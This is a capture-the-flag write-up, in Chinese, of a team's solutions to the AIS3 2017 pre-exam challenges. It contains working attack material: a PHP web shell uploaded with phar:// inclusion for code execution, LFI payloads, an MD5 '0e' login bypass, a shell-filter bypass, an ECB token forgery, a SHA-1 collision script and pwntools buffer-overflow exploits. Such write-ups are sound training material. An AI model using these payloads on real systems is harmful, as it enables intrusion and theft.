Ais3- pre-exam 2017 
===
## Team: TastyFeeder final score: 31
#### 有些題目忘記QAQ，感謝[vest12385](https://github.com/vest12385/AIS3-pre-exam-2017/tree/master/misc/1)在github有把所有題目放出來


Misc 1 (1pt)
---

#### Description

Welcome to AIS3 pre-exam!
We have prepared 20 quizzes this year, and many of them are much more easier than before! Please notice that the flag may begin with "ais3" or "AIS3"
For this welcome problem, please submit the key ais3{hello, world!}
Good luck to your AIS3 pre-exam! We look forward to meeting with you in AIS3 this summer!

#### Solution
Flag is in the Description
###### flag : ais3{hello, world!}

Misc 2 (2pt)
---

#### Description

Find the flag!
https://quiz.ais3.org:31532/

#### Solution
先用瀏覽器看source，看到有個被隱藏的圖片
![](https://i.imgur.com/rEBcqXS.png)
載下來後，完全發現不了任何東西
後來看了很久，發現有個header``HereItIs:Uzc0RzMyLnBocA==``
base64解碼後是S74G32.php
訪問後得到一張圖片
![](https://i.imgur.com/6dqHSO4.png)
用檢視器開啟可以看到flag隱藏在白底部份
![](https://i.imgur.com/BDQ893v.png)

###### flag : AIS3{pika}

Misc 4 (4pt)
---

#### Description

Find the flag!
ssh://misc4@quiz.ais3.org :31534/ (login password is ais3)

#### Solution
用ssh連過去後，裡面有三個檔案，flag、shell.c、shell
cat shell.c後可以看到
```clike=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "\\")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        setregid(getegid(), -1);
        if(argc < 2) { return 0; }
        delete_env();
        putenv("PATH=/this_is_not_a_valid_path");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```
它會幫我們呼叫輸入的command，但會過濾一些東西
我一開始嘗試用echo 印出第一個檔案，
但失敗了，不知道為什麼
後來搜尋了一下，發現是pwnable.kr的題目
改了一下網路解法（其實就只是改路徑而已）
``./shell "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)misc4\$(pwd)*"``
拿到flag

不過我後來有看到別人用``cat "fl"ag "f"lag``

###### flag : 我忘記存下來了QAQ

Web 1 (1pt)
---

#### Description
Find the flag!

https://quiz.ais3.org:42351/


#### Solution
用curl送就可以拿到了
```
curl https://quiz.ais3.org:42351/
```

###### flag : AIS3{As_Simple_As_Usual}

Web 2 (2pt)
---

#### Description
Find the flag!

https://quiz.ais3.org:42351/


#### Solution
進去後是一個網頁，可以拿到source code
```php=
<?php
include("flag.php");

if (isset($_GET["source"])) {
    show_source(__FILE__);
    exit();
}

$db = array(
    array("username" => "delicia", "password" => "6d386d56781b744d31328faace811444"),
    array("username" => "earnest", "password" => "907d82744bb98e956f82077a20cf92d3"),
    array("username" => "chaya", "password" => "0c914720b899f04c3522a6a467d23e07"),
    array("username" => "carlos", "password" => "4a84296507efdac241f300b4676c8448"),
    array("username" => "celine", "password" => "b74f357a8ef07a954ef3c2b780f09309"),
    array("username" => "trena", "password" => "d8a7a3e0bee98a1315f1ebeb8a6cabe5"),
    array("username" => "otis", "password" => "ca3ace395c61849f13b0a12e939ba101"),
    array("username" => "kristyn", "password" => "467bbf3d08f6d7b46a169257d2f1190a"),
    array("username" => "meaghan", "password" => "df70b80ddd44e63bc5f4eb3c4f920e77"),
    array("username" => "lacresha", "password" => "aaef40f431754fbec001172f0ce714b9"),
    array("username" => "alleen", "password" => "6d8fdad086cee23270c45a06362d03e8"),
    array("username" => "marketta", "password" => "50da5753695a6ba0514bb38d351cae81"),
    array("username" => "charlette", "password" => "3b10f46067c305ba6a10d9d3ca68e56c"),
    array("username" => "golda", "password" => "05615438bb05818cf11abb7c4bc12033"),
    array("username" => "miki", "password" => "e99a9c9124c6b4e8a7d114c95106cbb1"),
    array("username" => "adelaide", "password" => "6197a1a44aac59234fab3c7fdc872b64"),
    array("username" => "yung", "password" => "06418dc6dad833585d54e81b340c0a99"),
    array("username" => "delcie", "password" => "5f1bc54558e89ad5078ffb56bda5f86b"),
    array("username" => "alisia", "password" => "ddc21c265a7536dcf6854f5fd744b2a2"),
    array("username" => "vicki", "password" => "6bf94c6f0f5a6fac2c6859bebe2de44f"),
    array("username" => "jarrod", "password" => "6f0b8474de3252bfda8177c7f81f5bc8"),
    array("username" => "liberty", "password" => "64b73e2569bb43e6d80fffa90327e5d6"),
    array("username" => "dani", "password" => "f8aa590cb16d8746d2530f2d6b082e88"),
    array("username" => "dillon", "password" => "cb2277c9f695cd4c4d8453b531329c69"),
    array("username" => "quinton", "password" => "e322aae4dd7de048f8a5827874dcaa9b"),
    array("username" => "caridad", "password" => "edf4bcb49c1bc2e0aa720ad25978de70"),
    array("username" => "lucas", "password" => "a551c048a50263748a98a3a914da202d"),
    array("username" => "sena", "password" => "0e959146861158620914280512624073"),
    array("username" => "deja", "password" => "590aea8ba65098dccb7ee6835039f949"),
    array("username" => "fiona", "password" => "8c15dd1dcd59386d2a813eaa9ac01945"),
    array("username" => "mechelle", "password" => "ca8087d12f12a9442e1c59942173fa58"),
    array("username" => "an", "password" => "cf0d72a68a70e78f78b4b97d0fef7d89"),
    array("username" => "chadwick", "password" => "e564ee0a33eedb3cb99a8fa363ff3d39"),
    array("username" => "sandi", "password" => "8f92e127efcd049303431724661cc51a"),
    array("username" => "leola", "password" => "aa01b9fa4db785a7a4422b069a0777dd"),
    array("username" => "enid", "password" => "881592be42a22ae1011ff21bd8da57f9"),
    array("username" => "dewitt", "password" => "35646ebd5bb1bdeb05a9989cd4e2317a"),
    array("username" => "tamala", "password" => "9e2932b9be2ce2fbe6679c704fa32370"),
    array("username" => "madelaine", "password" => "ae9608b773317fb14776a1f03004ed3f"),
    array("username" => "ivan", "password" => "2bc7fce377c6a9568afa03d92c902cd7"),
    array("username" => "demetrius", "password" => "bbb3778c0359cdb6ea78a9a184396fde"),
    array("username" => "nevada", "password" => "a443c85070f9b92c6639f63bf46cf465"),
    array("username" => "lawanda", "password" => "04680fefd56ef0b2606e8df32ca7e578"),
    array("username" => "nancee", "password" => "9e1bc7ff8116dbb522a1399ef9fbca2a"),
    array("username" => "alexia", "password" => "5699f2844f7e41da9cf98aed003be6dd"),
    array("username" => "porsha", "password" => "4f38dcc1120d8824de4db6d20c892072"),
    array("username" => "edda", "password" => "fe5cc1e65c1e34046d34b6fd325729b6"),
    array("username" => "lucy", "password" => "fda2dc38e34f89e3018483fb25d7c471"),
    array("username" => "gilbert", "password" => "54ea997a290c9b00f918aa5078f8afa1"),
    array("username" => "tamica", "password" => "7a210fab1fda43d6ab88db77a43ef2f2")
);

$msg = "";
if (isset($_POST["username"]) and isset($_POST["password"]))
{
    $username = (string)$_POST["username"];
    $password = (string)$_POST["password"];

    $success = false;
    foreach ($db as $row)
    {
        if ($username == $row["username"] and md5($password) == $row["password"])
        {
            $msg = "Successful login as $username. Here's your flag: ".$flag;
            $success = true;
            break;
        }
    }
    if (!$success)
    {
        $msg = "Invalid username or password.";
    }
}
?>
```
可以看到拿到帳號密碼後，轉成string。應該沒辦法用型態不同過判斷。
但md5檢查這行用``==``，沒有檢查型態。
這讓我想到之前看過得一個php trick，字串科學記號的型態``0e``開頭，會被判斷為數字0
因此開始在上面找有沒有md5後是0e開頭的
找到這組
``array("username" => "sena", "password" => "0e959146861158620914280512624073"),``
因此在username填sena，密碼到網路找一個md5後是``0e``開頭的:``240610708``


###### flag : AIS3{Hey!Why_can_you_login_without_the_password???}


Web 3 (3pt)
---

#### Description
Find the flag!

https://quiz.ais3.org:23545/

#### Solution
一開始看到這頁面，找了一番，沒看到什麼東西
後來按about，可以看到網頁後面多個``?p=about``
感覺這裡可以輸入東西
嘗試了一些奇怪的東西，沒什麼反應
突然想到之前有遇過在header裡面``LFI``的題目
來嘗試一下``?p=php://filter/convert.base64-encode/resource=about.php``
失敗
嘗試``?p=php://filter/convert.base64-encode/resource=about``
得到about.php檔案的base64
開始找這各種檔案
最後試到一個常用的index.php
拿到下面的檔案，檔案中有flag
```php=
<?php
// flag1: AIS3{Cute_Snoopy_is_back!!?!?!!?}


// disabled for security issue
$blacklist = ["http", "ftp", "data", "zip"];
foreach ($blacklist as &$s)
    stream_wrapper_unregister($s);

$FROM_INCLUDE = true;

$pages = array(
    // disabled
    // "uploaddddddd" => "Uploads",
    "about" => "About"
);

if (isset($_GET["p"]))
    $p = $_GET["p"];
else
    $p = "home";


if(strlen($p) > 100)
{
    die("parameter is too long");
}

?>

<!DOCTYPE html>
<html lang="en">
<?php
include "header.php";
include $p . ".php";
?>
<footer class="footer">
    <p>© cebrusfs 2017</p>
</footer>
</body>
</html>
```
###### flag : AIS3{Cute_Snoopy_is_back!!?!?!!?}

Web 4 (4pt)
---
#### Description
Find the flag!

https://quiz.ais3.org:23545/

#### Solution
同一題藏有第二個flag
看一下上面的php code 可以發現有一個uploads的功能被隱藏起來
打入``?p=uploaddddddd``可以到一個上傳圖檔的地方
先拿到upload的source code
```php=
<?php
if (! $FROM_INCLUDE)
    exit('not allow direct access');

function RandomString()
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randstring = "";
    for ($i = 0; $i < 9; $i++) {
        $randstring .= $characters[rand(0, strlen($characters)-1)];
    }
    return $randstring;
}

$target_dir = "images";
$uploadOk = false;
if(isset($_FILES["fileToUpload"]))
{
    $filename = basename($_FILES['fileToUpload']['name']);
    $imageFileType = pathinfo($filename, PATHINFO_EXTENSION);
    if($imageFileType == "jpg")
    {
        $uploadOk = 1;
    }
    else
    {
        echo "<center><p>Sorry,we only accept jpg file</p></center>";
        $uploadOk = 0;
    }

    $fsize = $_FILES['fileToUpload']['size'];
    if(!($fsize >= 0 && $fsize <= 200000))
    {
        $uploadOk = 0;
        echo "<center><p>Sorry, the size too large.</p></center>";
    }
}

if($uploadOk)
{
    $ip = $_SERVER["REMOTE_ADDR"];

    $dir = "$target_dir/$ip";
    if(!is_dir($dir))
        mkdir($dir);

    $newid = RandomString();
    $newpath = "$dir/$newid.jpg";
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $newpath))
    {
        header("Location: $newpath");
        exit();
    }
    else
    {
        echo "<center><p>Something bad happend, please contact the AIS3 admin to solve this</p></center>";
    }
}
?>

<!-- Page Content -->
<div class="container">
    <!-- Marketing Icons Section -->
    <div class="row">
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label class="control-label">Select a good Snoopy picture (JPG only)</label>
                <input id="input-1" name="fileToUpload" type="file" class="file">
            </div>
        </form>
    </div>
    <script>
    // initialize with defaults
    $("#input-1").fileinput();

    // with plugin options
    $("#input-1").fileinput({'showUpload':false, 'previewFileType':'any'});
    </script>
</div>

```
之前有看過一個用上傳圖片放shellcode的方法
就是把zip檔上傳，然後用zip打開，執行。
因此先寫個php shellcode
```php=
<?php system($_GET['cmd']);
```
上傳圖片後，可以得到上傳檔案的檔名``RFJXxhTug.jpg``
``https://quiz.ais3.org:23545/?p=zip://images/58.114.189.33/RFJXxhTug.jpg%23a&cmd=ls``
失敗
後來看到index 有檔zip字串
只好改成phar
``https://quiz.ais3.org:23545/?p=phar://images/58.114.189.33/RFJXxhTug.jpg/a&cmd=ls``
``https://quiz.ais3.org:23545/?p=phar://images/58.114.189.33/RFJXxhTug.jpg/a&cmd=cat%20the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l``
拿到flag

###### flag : AIS3{RCEEEEEEEEE_is_soooooooooo_funnnnnnnnnnnn!?!!?!!!}


crypto　1 (1pt)
---


#### Description
Find the flag!

crypto1.pub.cpp

#### Solution
給個cpp如下
```clike=
#include <stdio.h>
#include <string.h>

int main()
{
    int val1 = ?????????, val2 = ?????????, val3 = ???????, val4 = ??????, i, *ptr;
    char flag[29] = "????????????????????????????"; // Hint: The flag begins with AIS3
    
    for(i = 0, ptr = (int*)flag ; i < 7 ; ++i)
        printf("%d\n", ptr[i] ^ val1 ^ val2 ^ val3 ^ val4);
    
    /*
    964600246
    1376627084
    1208859320
    1482862807
    1326295511
    1181531558
    2003814564
    */
    
    return 0;
}
```
把flag跟一些東西XOR後，以整數輸出
簡單的XOR，寫個c來解，先猜開頭是ais3或AIS3就可以知道val1~val4 xor 的值了
```clike=
#include <stdio.h>

int main()
{
    int result[] ={964600246,1376627084,1208859320,1482862807,1326295511,1181531558,2003814564};
    char flag[29];
    flag[0] = 'A';
    flag[1] = 'I';
    flag[2] = 'S';
    flag[3] = '3';
    int *ptr;
    ptr = (int*)flag;
    int key = result[0] ^ ptr[0];
    int i ;
    for(i = 1, ptr = (int*)flag ; i < 7 ; ++i)
        ptr[i] = key ^ result[i];
    flag[28] = '\0';
    printf("%s\n",flag);
    return;
}    
```
拿到flag
###### flag :AIS3{A XOR B XOR A EQUALS B}

crypto　2 (2pt)
---


#### Description
Find the flag!

telnet://quiz.ais3.org:3212/

./ecb_server_public

#### Solution
首先題目給了一隻python
```python=
#!/usr/bin/python3
import signal
import sys
import os
import time
import string

if sys.version_info < (3, 0): # For python2
    from urlparse import parse_qs
else: # For python3
    from urllib.parse import parse_qs

from base64 import b64encode as b64e
from base64 import b64decode as b64d
from Crypto.Cipher import AES

FLAG = UNKNOWN_FLAG
KEY = UNKNOWN_KEY
IV = UNKNOWN_IV

blockSize = 16

if sys.version_info < (3, 0): # For python2
    input = raw_input


class AESCryptor:

    def __init__(self, key, iv):

        self.KEY = key
        self.IV = iv
        self.aes = AES.new(self.KEY, AES.MODE_ECB, self.IV)


    def encrypt(self, data):
        return self.aes.encrypt(self.pad(data))


    def decrypt(self, data):
        return self.unpad(self.aes.decrypt(data))

    def pad(self, data):
        num = blockSize - len(data) % blockSize
        return data + chr(num) * num

    def unpad(self, data):

        lastValue = 0

        if type(data[-1]) is int:
            lastValue = data[-1]
        else:
            lastValue = ord(data[-1])

        return data[:len(data)-lastValue]


aes = AESCryptor(KEY, IV)


def bye(s):

    print(s)
    exit(0)


def alarm(time):

    signal.signal(signal.SIGALRM, lambda signum, frame: bye('Too slow!'))
    signal.alarm(time)


def printFlag():

    print(FLAG)


def register():

    name = input('What is your name? ').strip()

    for c in name:
        if c not in string.ascii_letters:
            bye('Invalid characters.(Only alphabets are permitted)')

    pwd = input('Give me your password: ').strip()

    for c in pwd:
        if c not in string.ascii_letters:
            bye('Invalid characters. (Only alphabets are permitted)')

    pattern = 'name=' + name + '&role=student' + '&password=' + pwd

    print('This is your token: ' + b64e(aes.encrypt(pattern)).decode())


def login():

    token = input('Give me your token: ').strip()
    name = input('Give me your username: ').strip().encode()
    pwd = input('Give me your password: ').strip().encode()

    try:
        pt = aes.decrypt(b64d(token))
        data = parse_qs(pt, strict_parsing=True)

        if name != data[b'name'][0] or pwd != data[b'password'][0]:
            print('Authentication failed')
            return

        print('Hello %s' % data[b'name'][0].decode())

        if b'admin' in data[b'role']:
            print('Hi admin:')
            printFlag()

    except Exception:
        print('Something went wrong!! QAQ')



def main():

    alarm(60)
    print('Select your choice: ')
    print('0 : Register')
    print('1 : Login')
    num = int(input().strip())

    if num == 0:
        register()
    elif num == 1:
        login()

if __name__ == '__main__':

    main()

```

大致上就是把輸入以16為一ECB個block，拿來作AES的ECB加密
由於key都沒換，可以拿來組出奇怪的pattern
``pattern = 'name=' + name + '&role=student' + '&password=' + pwd``
因為每輸入16字元會被分到不同block
所以輸入name ``AAAAA`` password ``admin``
會變成
``name=AAAAA&role=`` | ``student&password`` | ``=admin``
輸入　name ``AAAAABBBBBBadmin`` password ``admin``
會變成
``name=AAAABBBBBB`` | ``admin&role=stude`` | ``nt&password=admi`` | ``n``
把第一次輸入的第一個block跟第二次輸入的第二個block之後的組起來
就變成
``name=AAAAA&role=`` |　``admin&role=stude`` | ``nt&password=admi`` | ``n``
解出來變成
``name=AAAAA&role=admin&role=student&password=admin``
在判斷角色的時候``if b'admin' in data[b'role']:``
只有判斷admin有沒有在data[b'role']裡
因此可以通過判斷，以下是最後輸入結果
```
Give me your token: knBp3iFSqM6W+mrXD14pOaFla42tcnIFcK3CMGGtQdnpLxLVcNsXmC8lrW1/BSojKP2gj4SXdOf3WfxaSRoZSg==
Give me your username: AAAAA
Give me your password: admin
Hello AAAAA
Hi admin:
ais3{ABCDEFGHIJKLMNOPQRSTUVWXYZZZZZZZ}
```
###### flag: ais3{ABCDEFGHIJKLMNOPQRSTUVWXYZZZZZZZ}

crypto　3 (3pt)
---


#### Description
Find the flag!

https://quiz.ais3.org:32670/

#### Solution
這題可以先看到source code(忘記載下來了QAQ) ，大致上是讓我們輸入帳號密碼
比對兩者是否一樣後
再比對兩者sha1有沒有一樣
這題讓我覺得好像看過
後來查了一下，出現在Boston Key Party CTF 2017
之前去參加打醬油的時候有看到過
那個時候剛好google算出sha1的碰撞
因此載了google 給的2個pdf
先上傳上去，結果得到request太長。
在稍微看了一下那篇論文後
發現他是前320byte就可以了
於是把前320byte拿出來上傳，拿到flag
```python=
import requests
if __name__ == "__main__":
    HOST = "https://quiz.ais3.org:32670/"
#    fo1 = open('1.data','rb').read()
#    fo2 = open('2.data','rb').read()
    fo1 = open('1.pdf','rb').read()[:320]
    fo2 = open('2.pdf','rb').read()[:320]
    post_data = {'username':fo1,'password':fo2}
    req = requests.post(HOST,data=post_data)
    print req.content
```
###### flag:AIS3{SHA1111l111111_is_broken}


crypto　4 (4pt)
---


#### Description
Find the flag!

https://quiz.ais3.org:32670/

#### Solution
第三題後面還有一個判斷，在帳號密碼中要分別找到``Snoopy_do_not_like_cats_hahahaha`` ``ddaa_is_PHD1``
且sha1sum 的開頭要是``f00d``
再次確認論文中後面加什麼都可以後
先加入``Snoopy_do_not_like_cats_hahahahaddaa_is_PHD1``
後面在隨意放東西直到開頭是``f00d``
程式如下
```python=
import string
import requests
import random
import hashlib
##xxd -l 320 2.pdf|xxd -r >2.data
if __name__ == "__main__":
    HOST = "https://quiz.ais3.org:32670/"
    fo1 = open('1.pdf','rb').read()[:320]
    fo2 = open('2.pdf','rb').read()[:320]
    S = 'Snoopy_do_not_like_cats_hahahahaddaa_is_PHD1'   
    while(True):
        S_test = S
        for i in range(16):
            S_test += random.choice(string.letters)
        m = hashlib.sha1()
        m.update(fo1+S_test)
        shone = m.digest().encode('hex')
        print 'Now trying:',shone
        if shone.startswith('f00d'):
            S = S_test
            break
    post_data = {'username':fo1+S,'password':fo2+S}
    req = requests.post(HOST,data=post_data)
    print req.content

```
暴力嘗試一下就好了
![](https://i.imgur.com/tRejXnb.png)

###### flag: AIS3{Any_limitation_can_not_stop_me!!!!!l!!!!}

pwn　1 (1pt)
---


#### Description
Find the flag!

telnet://quiz.ais3.org:9561

pwn1.bin

#### Solution
先執行給的檔案看看，叫我們輸入一個string，亂輸入就seg fault
![](https://i.imgur.com/fsHQwtn.png)
用objdump可以大致上看出來它把我們的輸入當address來call
```
 8048678:       e8 d3 fd ff ff          call   8048450 <__isoc99_scanf@plt>
 804867d:       83 c4 10                add    $0x10,%esp
 8048680:       8d 45 e4                lea    -0x1c(%ebp),%eax
 8048683:       8b 00                   mov    (%eax),%eax
 8048685:       89 45 e0                mov    %eax,-0x20(%ebp)
 8048688:       8b 45 e0                mov    -0x20(%ebp),%eax
 804868b:       ff d0                   call   *%eax
```
至於要跳到哪
我在裡面翻到有個function叫``youcantseeme``
```
0804860a <youcantseeme>:
 804860a:       55                      push   %ebp
 804860b:       89 e5                   mov    %esp,%ebp
 804860d:       83 ec 08                sub    $0x8,%esp
 8048610:       83 ec 0c                sub    $0xc,%esp
 8048613:       68 5c 87 04 08          push   $0x804875c
 8048618:       e8 03 fe ff ff          call   8048420 <system@plt>
 804861d:       83 c4 10                add    $0x10,%esp
 8048620:       90                      nop
 8048621:       c9                      leave  
 8048622:       c3                      ret
```
看了一下　它call了system，命令放在``0x804875c``
![](https://i.imgur.com/w6oKb77.png)
用gdb看了一下，是call shell!!!
所以直接跳過去可以拿到shell
```python=
from pwn import *

if __name__ == '__main__':
    binary = 'pwn1.bin'
    HOST = 'quiz.ais3.org'
    PORT = 9561
    mode = raw_input('mode:\n')
    if mode == 'r\n':
        r = remote(HOST,PORT)
    else:
        r = process('./'+binary)
    raw_input('time to attach')
    payload = p32(0x08048613)
    print payload
    r.sendline(payload)
    r.interactive()
```
拿到後路徑在root
經過一番尋找，flag放在 home/pwn1/flag

###### flag : 我忘記把flag存下來了

pwn　2 (2pt)
---


#### Description
Find the flag!

Appjailuncher.exe /port:56746 /key:flag.txt /timeout:30000000 pwn2.exe

telnet://quiz.ais3.org:56746

AppJailLauncher.exe pwn2.cpp pwn2.exe pwn2.pdb

#### Solution
他有給c code
```clike=
// ais3_pwn1.cpp : �w�q�D���x���ε{�����i�J�I�C
//

#include "stdafx.h"
#include <windows.h>  
#include <stdio.h>  
#include <stdlib.h>

struct user {
    char name[20];
    int pass;
} ais3_user;

void menu() {
    puts("=================================");
    puts(" 1. Capture The Flag ");
    puts(" 2. Exit ");
    puts("=================================");
    printf("Your choice :");
};

void readflag() {
    char buf[100];
    FILE *fp;
    fp = fopen("./flag.txt", "rb");
    if (fp) {
        fread(buf, 40, 1, fp);
        fclose(fp);
        for (int i = 0; i < 40; i++) {
            buf[i] = buf[i] ^ ais3_user.pass;
        }
        printf("Magic : %s\n", buf);
        Sleep(2);
        exit(0);
    }
};


int main()
{
    int password;
    char choice[12];
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    ais3_user.pass = (int)&password;
    puts("======== AIS3 Login sytem ========");
    printf(" Username : ");
    scanf("%s",ais3_user.name);
    printf(" Password : ");
    scanf("%d", &password);
    if (password == ais3_user.pass) {
        puts("Login Success !");
        while (1) {
            menu();
            fgets(choice, 4, stdin);
            switch (atoi(choice)) {
                case 1:
                    readflag();
                    break;
                case 2 :
                    puts("Bye ~");
                    exit(0);
                    break;
                deafult:
                    puts("Invaild choice !");
                    break;

            }
        }
    }
    else {
        puts("Sorry ! Try your best !");
        exit(0);
    }

    return 0;
}
```
發現在輸入username的時候可以overflow蓋掉pass
因此蓋掉後登入readflag即可
```python=
from pwn import *
import time
if __name__ == '__main__':
    HOST = 'quiz.ais3.org'
    PORT = 56746
    r = remote(HOST,PORT)
    r.recvuntil(' Username : ')
    r.sendline('A'*20+'\xff'*4)
    r.recvuntil(' Password : ')
    r.sendline("-1")
    r.recvuntil(':')
    r.sendline("1")
    a = r.recv()
    time.sleep(2)
    
    a = r.recvuntil('Magic : ')
    print a.encode('hex')
    flag = ''
    for ch in a :
        flag += chr(ord(ch)^0xff)
    
    r.interactive()
```
###### flag :AIS3{FUCK_YOU}

pwn　3 (3pt)
---


#### Description
Find the flag @ /home/pwn3/flag!

telnet://quiz.ais3.org:9563

pwn3

#### Solution
64bit的　read write，最後沒時間作，應該是用sys call open -->read --> write到stdout

reverse　1 (1pt)
---

#### Description
Find the flag!

rev1.exe
#### Solution
基本上這題我沒解，因為我在linux用wine執行就跑出flag了

###### flag:AIS3{h0w d1d y0u s3e it}

reverse　2 (2pt)
---

#### Description

encrypted rev2
#### Solution
這題有想法，但沒做出來
先開ida pro看，發現它會隨機拿東西跟flag作xor
且程式開頭有說他在哪一天build的``We build up this system on 2017/6/26 (UTC+8)``
應該是只要暴力去試那天的seed就可以找到開頭是asi3或AIS3的
但我寫好去睡覺讓它跑
隔天醒來都沒跑好，應該是程式寫錯了QAQ

###### flag:



